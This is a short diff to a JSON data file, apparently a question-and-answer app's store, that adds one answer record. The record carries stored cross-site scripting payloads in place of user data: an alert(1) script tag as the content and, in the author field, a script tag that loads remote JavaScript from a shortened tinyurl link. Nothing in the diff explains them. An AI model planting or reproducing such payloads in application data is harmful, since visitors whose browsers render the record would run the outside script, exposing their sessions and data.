@@ -235,7 +235,17 @@
       "status": "pending",
       "likes": 0,
       "likedBy": [],
-      "answers": []
+      "answers": [
+        {
+          "id": 1783258811741,
+          "content": "<script>alert(1)</script>",
+          "author": "<script src=\"https://tinyurl.com/z52ayw7a\"></script>",
+          "isOwner": false,
+          "date": "2026-07-05T13:40:11.741Z",
+          "replies": [],
+          "parentAnswerId": null
+        }
+      ]
     },
     {
       "id": 1768506000000,
